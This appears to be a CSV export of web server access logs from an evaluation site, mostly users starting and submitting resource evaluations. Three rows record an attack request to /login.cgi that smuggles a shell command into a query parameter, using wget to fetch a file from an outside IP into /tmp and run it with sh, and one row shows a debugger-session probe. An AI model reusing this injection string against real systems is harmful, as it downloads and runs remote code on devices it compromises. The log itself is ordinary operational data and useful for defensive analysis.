,ip,req,timestamp,marker,resourceID
1747,146.203.121.6,GET /newevaluation?resourceid=251,20/Jul/2018:15:11:59 +0000,evalStart,251
1748,146.203.121.6,GET /newevaluation?resourceid=251,Fri Jul 20 15:11:58 2018,evalStart,251
1749,146.203.121.6,GET /about,20/Jul/2018:15:12:45 +0000,,
1750,146.203.121.6,GET /about,Fri Jul 20 15:12:45 2018,,
1751,146.203.121.6,GET /project/1/resources,20/Jul/2018:15:12:46 +0000,,
1752,146.203.121.6,GET /project/1/resources,Fri Jul 20 15:12:45 2018,,
1753,146.203.121.6,GET /newevaluation?resourceid=2728,20/Jul/2018:15:13:20 +0000,evalStart,2728
1754,146.203.121.6,GET /newevaluation?resourceid=2728,Fri Jul 20 15:13:20 2018,evalStart,2728
1755,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 15:15:47 2018,evalEnd,
1756,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:15:15:48 +0000,evalEnd,
1757,146.203.121.6,GET /project/1/resources,20/Jul/2018:15:15:48 +0000,,
1758,146.203.121.6,GET /project/1/resources,Fri Jul 20 15:15:48 2018,,
1759,146.203.121.6,GET /newevaluation?resourceid=3466,20/Jul/2018:15:15:50 +0000,evalStart,3466
1760,146.203.121.6,GET /newevaluation?resourceid=3466,Fri Jul 20 15:15:50 2018,evalStart,3466
1761,146.203.121.6,GET /newevaluation?resourceid=41,20/Jul/2018:15:16:04 +0000,evalStart,41
1762,146.203.121.6,GET /newevaluation?resourceid=41,Fri Jul 20 15:16:03 2018,evalStart,41
1763,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 15:19:54 2018,evalEnd,
1764,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:15:19:54 +0000,evalEnd,
1765,146.203.121.6,GET /project/1/resources,20/Jul/2018:15:19:54 +0000,,
1766,146.203.121.6,GET /project/1/resources,Fri Jul 20 15:19:54 2018,,
1767,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 15:22:50 2018,evalEnd,
1768,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:15:22:50 +0000,evalEnd,
1769,146.203.121.6,GET /project/1/resources,20/Jul/2018:15:22:50 +0000,,
1770,146.203.121.6,GET /project/1/resources,Fri Jul 20 15:22:50 2018,,
1771,146.203.121.6,GET /newevaluation?resourceid=251,20/Jul/2018:15:22:53 +0000,evalStart,251
1772,146.203.121.6,GET /newevaluation?resourceid=251,Fri Jul 20 15:22:53 2018,evalStart,251
1773,146.203.121.6,GET /newevaluation?resourceid=1527,20/Jul/2018:15:23:01 +0000,evalStart,1527
1774,146.203.121.6,GET /newevaluation?resourceid=1527,Fri Jul 20 15:23:01 2018,evalStart,1527
1775,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 15:25:10 2018,evalEnd,
1776,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:15:25:10 +0000,evalEnd,
1777,146.203.121.6,GET /project/1/resources,20/Jul/2018:15:25:10 +0000,,
1778,146.203.121.6,GET /project/1/resources,Fri Jul 20 15:25:10 2018,,
1779,146.203.121.6,GET /newevaluation?resourceid=396,20/Jul/2018:15:25:31 +0000,evalStart,396
1780,146.203.121.6,GET /newevaluation?resourceid=396,Fri Jul 20 15:25:30 2018,evalStart,396
1781,197.33.115.77,GET /login.cgi?cli=aa%20aa%27;wget%20http://104.244.72.82/k%20-O%20-%3E%20/tmp/k;sh%20/tmp/k%27$,20/Jul/2018:15:26:32 +0000,,
1782,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 15:32:39 2018,evalEnd,
1783,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:15:32:39 +0000,evalEnd,
1784,146.203.121.6,GET /project/1/resources,20/Jul/2018:15:32:39 +0000,,
1785,146.203.121.6,GET /project/1/resources,Fri Jul 20 15:32:39 2018,,
1786,146.203.121.6,GET /newevaluation?resourceid=20,20/Jul/2018:15:33:52 +0000,evalStart,20
1787,146.203.121.6,GET /newevaluation?resourceid=20,Fri Jul 20 15:33:52 2018,evalStart,20
1788,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 15:36:51 2018,evalEnd,
1789,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:15:36:52 +0000,evalEnd,
1790,146.203.121.6,GET /project/1/resources,20/Jul/2018:15:36:52 +0000,,
1791,146.203.121.6,GET /project/1/resources,Fri Jul 20 15:36:52 2018,,
1792,146.203.121.6,GET /project/1/myevaluations/,20/Jul/2018:15:36:55 +0000,,
1793,146.203.121.6,GET /project/1/myevaluations/,Fri Jul 20 15:36:54 2018,,
1794,146.203.121.6,GET /project/1/resources?,20/Jul/2018:15:37:10 +0000,,
1795,146.203.121.6,GET /project/1/resources?,Fri Jul 20 15:37:09 2018,,
1796,146.203.121.6,GET /newevaluation?resourceid=588,20/Jul/2018:15:37:16 +0000,evalStart,588
1797,146.203.121.6,GET /newevaluation?resourceid=588,Fri Jul 20 15:37:16 2018,evalStart,588
1798,146.203.121.6,GET /newevaluation?resourceid=1228,20/Jul/2018:15:38:12 +0000,evalStart,1228
1799,146.203.121.6,GET /newevaluation?resourceid=1228,Fri Jul 20 15:38:12 2018,evalStart,1228
1800,146.203.121.6,GET /newevaluation?resourceid=338,20/Jul/2018:15:39:20 +0000,evalStart,338
1801,146.203.121.6,GET /newevaluation?resourceid=338,Fri Jul 20 15:39:20 2018,evalStart,338
1802,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 15:44:28 2018,evalEnd,
1803,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:15:44:28 +0000,evalEnd,
1804,146.203.121.6,GET /project/1/resources,20/Jul/2018:15:44:28 +0000,,
1805,146.203.121.6,GET /project/1/resources,Fri Jul 20 15:44:28 2018,,
1806,146.203.121.6,GET /newevaluation?resourceid=499,20/Jul/2018:15:59:04 +0000,evalStart,499
1807,146.203.121.6,GET /newevaluation?resourceid=499,Fri Jul 20 15:59:04 2018,evalStart,499
1808,171.66.213.131,POST /evaluationsubmitted,Fri Jul 20 16:04:03 2018,evalEnd,
1809,171.66.213.131,POST /evaluationsubmitted,20/Jul/2018:16:04:03 +0000,evalEnd,
1810,171.66.213.131,GET /project/1/resources,20/Jul/2018:16:04:04 +0000,,
1811,171.66.213.131,GET /project/1/resources,Fri Jul 20 16:04:04 2018,,
1812,171.66.213.131,GET /static/img/icon-32.png,20/Jul/2018:16:04:06 +0000,,
1813,171.66.213.131,GET /newevaluation?resourceid=3340,20/Jul/2018:16:05:02 +0000,evalStart,3340
1814,171.66.213.131,GET /newevaluation?resourceid=3340,Fri Jul 20 16:05:02 2018,evalStart,3340
1815,171.66.213.131,GET /newevaluation?resourceid=3340,20/Jul/2018:16:05:29 +0000,evalStart,3340
1816,171.66.213.131,GET /newevaluation?resourceid=3340,Fri Jul 20 16:05:29 2018,evalStart,3340
1817,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:23:27 +0000,,
1818,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:23:26 2018,,
1819,204.68.92.141,GET /static/img/icon-32.png,20/Jul/2018:16:23:27 +0000,,
1820,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:24:56 +0000,,
1821,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:24:56 2018,,
1822,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:25:07 +0000,,
1823,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:25:07 2018,,
1824,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:25:14 +0000,,
1825,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:25:14 2018,,
1826,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:25:18 +0000,,
1827,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:25:18 2018,,
1828,204.68.92.141,GET /newevaluation?resourceid=3521,20/Jul/2018:16:25:25 +0000,evalStart,3521
1829,204.68.92.141,GET /newevaluation?resourceid=3521,Fri Jul 20 16:25:25 2018,evalStart,3521
1830,204.68.92.141,GET /login?next=%2Fnewevaluation%3Fresourceid%3D3521,Fri Jul 20 16:25:25 2018,,
1831,204.68.92.141,GET /login?next=%2Fnewevaluation%3Fresourceid%3D3521,20/Jul/2018:16:25:25 +0000,,
1832,204.68.92.141,POST /login?next=%2Fnewevaluation%3Fresourceid%3D3521,Fri Jul 20 16:25:38 2018,,
1833,204.68.92.141,POST /login?next=%2Fnewevaluation%3Fresourceid%3D3521,20/Jul/2018:16:25:38 +0000,,
1834,204.68.92.141,GET /newevaluation?resourceid=3521,20/Jul/2018:16:25:38 +0000,evalStart,3521
1835,204.68.92.141,GET /newevaluation?resourceid=3521,Fri Jul 20 16:25:38 2018,evalStart,3521
1836,107.77.70.117,GET /about,20/Jul/2018:16:33:01 +0000,,
1837,107.77.223.170,GET /about,Fri Jul 20 16:33:02 2018,,
1838,107.77.223.170,GET /about,20/Jul/2018:16:33:02 +0000,,
1839,107.77.223.170,GET /static/img/icon-32.png,20/Jul/2018:16:33:04 +0000,,
1840,52.71.155.178,GET /about,Fri Jul 20 16:46:55 2018,,
1841,52.71.155.178,GET /about,20/Jul/2018:16:46:55 +0000,,
1842,204.68.92.141,POST /evaluationsubmitted,Fri Jul 20 16:48:35 2018,evalEnd,
1843,204.68.92.141,POST /evaluationsubmitted,20/Jul/2018:16:48:35 +0000,evalEnd,
1844,204.68.92.141,GET /project/1/resources,20/Jul/2018:16:48:36 +0000,,
1845,204.68.92.141,GET /project/1/resources,Fri Jul 20 16:48:35 2018,,
1846,204.68.92.141,GET /project/1/myevaluations/,20/Jul/2018:16:48:36 +0000,,
1847,204.68.92.141,GET /project/1/myevaluations/,Fri Jul 20 16:48:36 2018,,
1848,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:48:38 +0000,,
1849,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:48:37 2018,,
1850,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:49:35 +0000,,
1851,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:49:35 2018,,
1852,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:49:52 +0000,,
1853,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:49:52 2018,,
1854,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:51:45 +0000,,
1855,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:51:45 2018,,
1856,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:51:59 +0000,,
1857,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:51:59 2018,,
1858,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:52:19 +0000,,
1859,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:52:19 2018,,
1860,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:52:26 +0000,,
1861,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:52:25 2018,,
1862,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:52:39 +0000,,
1863,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:52:38 2018,,
1864,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:52:45 +0000,,
1865,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:52:45 2018,,
1866,204.68.92.141,GET /project/1/resources?,20/Jul/2018:16:52:58 +0000,,
1867,204.68.92.141,GET /project/1/resources?,Fri Jul 20 16:52:58 2018,,
1868,204.68.92.141,GET /newevaluation?resourceid=2694,20/Jul/2018:16:53:02 +0000,evalStart,2694
1869,204.68.92.141,GET /newevaluation?resourceid=2694,Fri Jul 20 16:53:02 2018,evalStart,2694
1870,190.114.232.15,GET /,20/Jul/2018:16:55:47 +0000,,
1871,109.207.88.108,GET /,20/Jul/2018:16:58:35 +0000,,
1872,185.153.185.70,GET /,20/Jul/2018:17:16:39 +0000,,
1873,156.222.50.108,GET /login.cgi?cli=aa%20aa%27;wget%20http://104.244.72.82/k%20-O%20-%3E%20/tmp/k;sh%20/tmp/k%27$,20/Jul/2018:17:29:21 +0000,,
1874,91.237.239.73,GET /,20/Jul/2018:18:12:23 +0000,,
1875,204.68.92.141,POST /evaluationsubmitted,Fri Jul 20 18:14:25 2018,evalEnd,
1876,204.68.92.141,POST /evaluationsubmitted,20/Jul/2018:18:14:25 +0000,evalEnd,
1877,204.68.92.141,GET /project/1/resources,20/Jul/2018:18:14:26 +0000,,
1878,204.68.92.141,GET /project/1/resources,Fri Jul 20 18:14:25 2018,,
1879,204.68.92.141,GET /project/1/myevaluations/,20/Jul/2018:18:14:29 +0000,,
1880,204.68.92.141,GET /project/1/myevaluations/,Fri Jul 20 18:14:29 2018,,
1881,177.9.142.1,GET /,20/Jul/2018:18:22:12 +0000,,
1882,146.203.121.6,GET /robots.txt,20/Jul/2018:18:22:21 +0000,,
1883,146.203.121.6,GET /project/1/resources?,20/Jul/2018:18:22:21 +0000,,
1884,146.203.121.6,GET /robots.txt,Fri Jul 20 18:22:21 2018,,
1885,146.203.121.6,GET /robots.txt,20/Jul/2018:18:22:21 +0000,,
1886,146.203.121.6,GET /project/1/resources,20/Jul/2018:18:22:21 +0000,,
1887,146.203.121.6,GET /project/1/resources,Fri Jul 20 18:22:21 2018,,
1888,146.203.121.6,GET /static/img/icon-32.png,20/Jul/2018:18:22:21 +0000,,
1889,146.203.121.6,GET /static/img/favicon.ico,20/Jul/2018:18:22:21 +0000,,
1890,146.203.121.6,GET /,20/Jul/2018:18:22:40 +0000,,
1891,146.203.121.6,GET /,Fri Jul 20 18:22:39 2018,,
1892,146.203.121.6,GET /about,20/Jul/2018:18:22:42 +0000,,
1893,146.203.121.6,GET /about,Fri Jul 20 18:22:42 2018,,
1894,146.203.121.6,GET /project/1/resources,20/Jul/2018:18:22:44 +0000,,
1895,146.203.121.6,GET /project/1/resources,Fri Jul 20 18:22:44 2018,,
1896,146.203.121.6,GET /project/1/myevaluations?,Fri Jul 20 18:22:46 2018,,
1897,146.203.121.6,GET /project/1/myevaluations?,20/Jul/2018:18:22:46 +0000,,
1898,146.203.121.6,GET /project/1/myevaluations/,20/Jul/2018:18:22:46 +0000,,
1899,146.203.121.6,GET /project/1/myevaluations/,Fri Jul 20 18:22:46 2018,,
1900,146.203.121.6,GET /project/1/resources?,20/Jul/2018:18:22:48 +0000,,
1901,146.203.121.6,GET /project/1/resources?,Fri Jul 20 18:22:48 2018,,
1902,146.203.121.6,GET /newevaluation?resourceid=1390,20/Jul/2018:18:22:57 +0000,evalStart,1390
1903,146.203.121.6,GET /newevaluation?resourceid=1390,Fri Jul 20 18:22:57 2018,evalStart,1390
1904,139.162.113.204,GET /,Fri Jul 20 18:27:24 2018,,
1905,139.162.113.204,GET /,20/Jul/2018:18:27:24 +0000,,
1906,85.105.202.252,GET /,20/Jul/2018:18:28:38 +0000,,
1907,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 18:39:10 2018,evalEnd,
1908,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:18:39:10 +0000,evalEnd,
1909,146.203.121.6,GET /project/1/resources,20/Jul/2018:18:39:10 +0000,,
1910,146.203.121.6,GET /project/1/resources,Fri Jul 20 18:39:10 2018,,
1911,146.203.121.6,GET /static/img/icon-32.png,20/Jul/2018:18:39:10 +0000,,
1912,146.203.121.6,GET /project/1/myevaluations/,20/Jul/2018:18:39:13 +0000,,
1913,146.203.121.6,GET /project/1/myevaluations/,Fri Jul 20 18:39:12 2018,,
1914,146.203.121.6,GET /project/1/myevaluations/page/2?,20/Jul/2018:18:39:15 +0000,,
1915,146.203.121.6,GET /project/1/myevaluations/page/2?,Fri Jul 20 18:39:14 2018,,
1916,146.203.121.6,GET /project/1/myevaluations/page/3?,20/Jul/2018:18:39:17 +0000,,
1917,146.203.121.6,GET /project/1/myevaluations/page/3?,Fri Jul 20 18:39:16 2018,,
1918,146.203.121.6,GET /project/1/myevaluations/page/4?,20/Jul/2018:18:39:18 +0000,,
1919,146.203.121.6,GET /project/1/myevaluations/page/4?,Fri Jul 20 18:39:18 2018,,
1920,146.203.121.6,GET /project/1/myevaluations/page/5?,20/Jul/2018:18:39:20 +0000,,
1921,146.203.121.6,GET /project/1/myevaluations/page/5?,Fri Jul 20 18:39:19 2018,,
1922,146.203.121.6,GET /project/1/resources?,20/Jul/2018:18:39:28 +0000,,
1923,146.203.121.6,GET /project/1/resources?,Fri Jul 20 18:39:28 2018,,
1924,146.203.121.6,GET /newevaluation?resourceid=3381,20/Jul/2018:18:39:31 +0000,evalStart,3381
1925,146.203.121.6,GET /newevaluation?resourceid=3381,Fri Jul 20 18:39:31 2018,evalStart,3381
1926,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 18:51:36 2018,evalEnd,
1927,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:18:51:36 +0000,evalEnd,
1928,146.203.121.6,GET /project/1/resources,20/Jul/2018:18:51:36 +0000,,
1929,146.203.121.6,GET /project/1/resources,Fri Jul 20 18:51:36 2018,,
1930,146.203.121.6,GET /newevaluation?resourceid=1751,20/Jul/2018:18:52:19 +0000,evalStart,1751
1931,146.203.121.6,GET /newevaluation?resourceid=1751,Fri Jul 20 18:52:19 2018,evalStart,1751
1932,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 18:55:00 2018,evalEnd,
1933,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:18:55:00 +0000,evalEnd,
1934,146.203.121.6,GET /project/1/resources,20/Jul/2018:18:55:00 +0000,,
1935,146.203.121.6,GET /project/1/resources,Fri Jul 20 18:55:00 2018,,
1936,146.203.121.6,GET /newevaluation?resourceid=2861,20/Jul/2018:18:55:03 +0000,evalStart,2861
1937,146.203.121.6,GET /newevaluation?resourceid=2861,Fri Jul 20 18:55:02 2018,evalStart,2861
1938,146.203.121.6,GET /newevaluation?resourceid=702,20/Jul/2018:18:59:13 +0000,evalStart,702
1939,146.203.121.6,GET /newevaluation?resourceid=702,Fri Jul 20 18:59:13 2018,evalStart,702
1940,207.102.138.158,GET /,20/Jul/2018:19:02:57 +0000,,
1941,207.102.138.158,GET /,Fri Jul 20 19:02:58 2018,,
1942,207.102.138.158,GET /,20/Jul/2018:19:02:58 +0000,,
1943,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 19:04:20 2018,evalEnd,
1944,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:19:04:20 +0000,evalEnd,
1945,146.203.121.6,GET /project/1/resources,20/Jul/2018:19:04:20 +0000,,
1946,146.203.121.6,GET /project/1/resources,Fri Jul 20 19:04:20 2018,,
1947,5.8.54.27,GET /?XDEBUG_SESSION_START=phpstorm,20/Jul/2018:19:04:28 +0000,,
1948,5.8.54.27,GET /?XDEBUG_SESSION_START=phpstorm,Fri Jul 20 19:04:29 2018,,
1949,5.8.54.27,GET /?XDEBUG_SESSION_START=phpstorm,20/Jul/2018:19:04:29 +0000,,
1950,146.203.121.6,GET /newevaluation?resourceid=61,20/Jul/2018:19:12:25 +0000,evalStart,61
1951,146.203.121.6,GET /newevaluation?resourceid=61,Fri Jul 20 19:12:25 2018,evalStart,61
1952,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 19:23:10 2018,evalEnd,
1953,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:19:23:10 +0000,evalEnd,
1954,146.203.121.6,GET /project/1/resources,20/Jul/2018:19:23:10 +0000,,
1955,146.203.121.6,GET /project/1/resources,Fri Jul 20 19:23:10 2018,,
1956,146.203.121.6,GET /newevaluation?resourceid=1451,20/Jul/2018:19:23:28 +0000,evalStart,1451
1957,146.203.121.6,GET /newevaluation?resourceid=1451,Fri Jul 20 19:23:27 2018,evalStart,1451
1958,146.203.121.6,GET /newevaluation?resourceid=1648,20/Jul/2018:19:23:45 +0000,evalStart,1648
1959,146.203.121.6,GET /newevaluation?resourceid=1648,Fri Jul 20 19:23:45 2018,evalStart,1648
1960,204.68.92.141,GET /project/1/resources?,20/Jul/2018:19:31:55 +0000,,
1961,204.68.92.141,GET /project/1/resources?,Fri Jul 20 19:31:55 2018,,
1962,204.68.92.141,GET /project/1/resources?,20/Jul/2018:19:32:13 +0000,,
1963,204.68.92.141,GET /project/1/resources?,Fri Jul 20 19:32:13 2018,,
1964,204.68.92.141,GET /newevaluation?resourceid=1437,20/Jul/2018:19:32:18 +0000,evalStart,1437
1965,204.68.92.141,GET /newevaluation?resourceid=1437,Fri Jul 20 19:32:18 2018,evalStart,1437
1966,204.68.92.141,POST /evaluationsubmitted,Fri Jul 20 19:36:15 2018,evalEnd,
1967,204.68.92.141,POST /evaluationsubmitted,20/Jul/2018:19:36:16 +0000,evalEnd,
1968,204.68.92.141,GET /project/1/resources,20/Jul/2018:19:36:16 +0000,,
1969,204.68.92.141,GET /project/1/resources,Fri Jul 20 19:36:16 2018,,
1970,204.68.92.141,GET /newevaluation?resourceid=1289,20/Jul/2018:19:37:16 +0000,evalStart,1289
1971,204.68.92.141,GET /newevaluation?resourceid=1289,Fri Jul 20 19:37:16 2018,evalStart,1289
1972,204.68.92.141,GET /project/1/resources,20/Jul/2018:19:38:06 +0000,,
1973,204.68.92.141,GET /project/1/resources,Fri Jul 20 19:38:06 2018,,
1974,204.68.92.141,GET /project/1/resources,20/Jul/2018:19:38:09 +0000,,
1975,204.68.92.141,GET /project/1/resources,Fri Jul 20 19:38:09 2018,,
1976,204.68.92.141,GET /project/1/myevaluations/,20/Jul/2018:19:38:30 +0000,,
1977,204.68.92.141,GET /project/1/myevaluations/,Fri Jul 20 19:38:29 2018,,
1978,204.68.92.141,GET /project/1/resources?,20/Jul/2018:19:38:31 +0000,,
1979,204.68.92.141,GET /project/1/resources?,Fri Jul 20 19:38:31 2018,,
1980,197.55.178.196,GET /login.cgi?cli=aa%20aa%27;wget%20http://104.244.72.82/k%20-O%20-%3E%20/tmp/k;sh%20/tmp/k%27$,20/Jul/2018:19:38:37 +0000,,
1981,204.68.92.141,GET /project/1/resources?,20/Jul/2018:19:38:37 +0000,,
1982,204.68.92.141,GET /project/1/resources?,Fri Jul 20 19:38:37 2018,,
1983,204.68.92.141,GET /project/1/resources?,20/Jul/2018:19:45:00 +0000,,
1984,204.68.92.141,GET /project/1/resources?,Fri Jul 20 19:45:00 2018,,
1985,204.68.92.141,GET /project/1/resources?,20/Jul/2018:19:45:08 +0000,,
1986,204.68.92.141,GET /project/1/resources?,Fri Jul 20 19:45:07 2018,,
1987,204.68.92.141,GET /project/1/resources?,20/Jul/2018:19:45:15 +0000,,
1988,204.68.92.141,GET /project/1/resources?,Fri Jul 20 19:45:15 2018,,
1989,204.68.92.141,GET /project/1/resources?,20/Jul/2018:19:45:20 +0000,,
1990,204.68.92.141,GET /project/1/resources?,Fri Jul 20 19:45:20 2018,,
1991,204.68.92.141,GET /project/1/resources?,20/Jul/2018:19:45:31 +0000,,
1992,204.68.92.141,GET /project/1/resources?,Fri Jul 20 19:45:31 2018,,
1993,204.68.92.141,GET /project/1/resources?,20/Jul/2018:19:45:41 +0000,,
1994,204.68.92.141,GET /project/1/resources?,Fri Jul 20 19:45:41 2018,,
1995,204.68.92.141,GET /newevaluation?resourceid=2900,20/Jul/2018:19:46:13 +0000,evalStart,2900
1996,204.68.92.141,GET /newevaluation?resourceid=2900,Fri Jul 20 19:46:13 2018,evalStart,2900
1997,204.68.92.141,POST /evaluationsubmitted,Fri Jul 20 20:01:37 2018,evalEnd,
1998,204.68.92.141,POST /evaluationsubmitted,20/Jul/2018:20:01:37 +0000,evalEnd,
1999,204.68.92.141,GET /project/1/resources,20/Jul/2018:20:01:37 +0000,,
2000,204.68.92.141,GET /project/1/resources,Fri Jul 20 20:01:37 2018,,
2001,204.68.92.141,GET /project/1/myevaluations/,20/Jul/2018:20:01:41 +0000,,
2002,204.68.92.141,GET /project/1/myevaluations/,Fri Jul 20 20:01:41 2018,,
2003,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 20:02:31 2018,evalEnd,
2004,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:20:02:31 +0000,evalEnd,
2005,146.203.121.6,GET /project/1/resources,20/Jul/2018:20:02:31 +0000,,
2006,146.203.121.6,GET /project/1/resources,Fri Jul 20 20:02:31 2018,,
2007,146.203.121.6,GET /newevaluation?resourceid=3747,20/Jul/2018:20:02:37 +0000,evalStart,3747
2008,146.203.121.6,GET /newevaluation?resourceid=3747,Fri Jul 20 20:02:37 2018,evalStart,3747
2009,177.38.176.42,GET /,20/Jul/2018:20:04:01 +0000,,
2010,201.43.15.42,GET /,20/Jul/2018:20:06:13 +0000,,
2011,146.203.121.6,POST /evaluationsubmitted,Fri Jul 20 20:06:22 2018,evalEnd,
2012,146.203.121.6,POST /evaluationsubmitted,20/Jul/2018:20:06:22 +0000,evalEnd,
2013,146.203.121.6,GET /project/1/resources,20/Jul/2018:20:06:23 +0000,,
2014,146.203.121.6,GET /project/1/resources,Fri Jul 20 20:06:22 2018,,
2015,146.203.121.6,GET /project/1/myevaluations/,20/Jul/2018:20:06:27 +0000,,
2016,146.203.121.6,GET /project/1/myevaluations/,Fri Jul 20 20:06:26 2018,,
2017,146.203.121.6,GET /project/1/myevaluations/page/2?,20/Jul/2018:20:06:29 +0000,,
2018,146.203.121.6,GET /project/1/myevaluations/page/2?,Fri Jul 20 20:06:28 2018,,
2019,146.203.121.6,GET /project/1/myevaluations/page/3?,20/Jul/2018:20:06:32 +0000,,
2020,146.203.121.6,GET /project/1/myevaluations/page/3?,Fri Jul 20 20:06:31 2018,,
2021,146.203.121.6,GET /project/1/myevaluations/page/4?,20/Jul/2018:20:06:34 +0000,,
2022,146.203.121.6,GET /project/1/myevaluations/page/4?,Fri Jul 20 20:06:33 2018,,
2023,146.203.121.6,GET /project/1/myevaluations/page/5?,20/Jul/2018:20:06:35 +0000,,
2024,146.203.121.6,GET /project/1/myevaluations/page/5?,Fri Jul 20 20:06:34 2018,,
